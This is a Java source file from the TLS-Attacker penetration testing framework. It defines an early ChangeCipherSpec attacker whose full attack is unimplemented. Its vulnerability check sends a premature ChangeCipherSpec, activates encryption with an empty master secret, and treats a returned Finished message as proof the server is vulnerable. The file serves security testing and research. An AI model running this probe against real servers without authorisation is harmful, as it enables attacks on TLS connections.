/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import java.util.LinkedList;
import java.util.List;

import de.rub.nds.tlsattacker.attacks.config.EarlyCCSCommandConfig;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.protocol.message.CertificateMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloDoneMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.util.LogLevel;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ActivateEncryptionAction;
import de.rub.nds.tlsattacker.core.workflow.action.ChangeMasterSecretAction;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;

public class EarlyCCSAttacker extends Attacker<EarlyCCSCommandConfig> {

    public EarlyCCSAttacker(EarlyCCSCommandConfig config) {
        super(config);
    }

    @Override
    public void executeAttack() {
        throw new UnsupportedOperationException("Not implemented yet");
    }

    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = config.createConfig();
        WorkflowTrace workflowTrace = new WorkflowTrace();

        workflowTrace.addTlsAction(new SendAction(new ClientHelloMessage(tlsConfig)));

        List<ProtocolMessage> messageList = new LinkedList<>();
        messageList.add(new ServerHelloMessage(tlsConfig));
        messageList.add(new CertificateMessage(tlsConfig));
        messageList.add(new ServerHelloDoneMessage(tlsConfig));
        workflowTrace.addTlsAction(new ReceiveAction(messageList));

        messageList = new LinkedList<>();
        messageList.add(new ChangeCipherSpecMessage(tlsConfig));
        workflowTrace.addTlsAction(new SendAction(messageList));

        byte[] emptyMasterSecret = new byte[0];
        workflowTrace.addTlsAction(new ChangeMasterSecretAction(emptyMasterSecret));
        workflowTrace.addTlsAction(new ActivateEncryptionAction());

        messageList = new LinkedList<>();
        ClientKeyExchangeMessage rsaMessage = new RSAClientKeyExchangeMessage(tlsConfig);
        rsaMessage.shouldAdjustRecordCipher = false;
        messageList.add(rsaMessage);

        messageList.add(new FinishedMessage(tlsConfig));
        workflowTrace.addTlsAction(new SendAction(messageList));

        messageList = new LinkedList<>();
        messageList.add(new ChangeCipherSpecMessage(tlsConfig));
        messageList.add(new FinishedMessage(tlsConfig));
        workflowTrace.addTlsAction(new ReceiveAction(messageList));

        State state = new State(tlsConfig, workflowTrace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();

        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, workflowTrace)) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Not vulnerable (probably), No Finished message found");
            return false;
        } else {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable (definitely), Finished message found");
            return true;
        }
    }

}
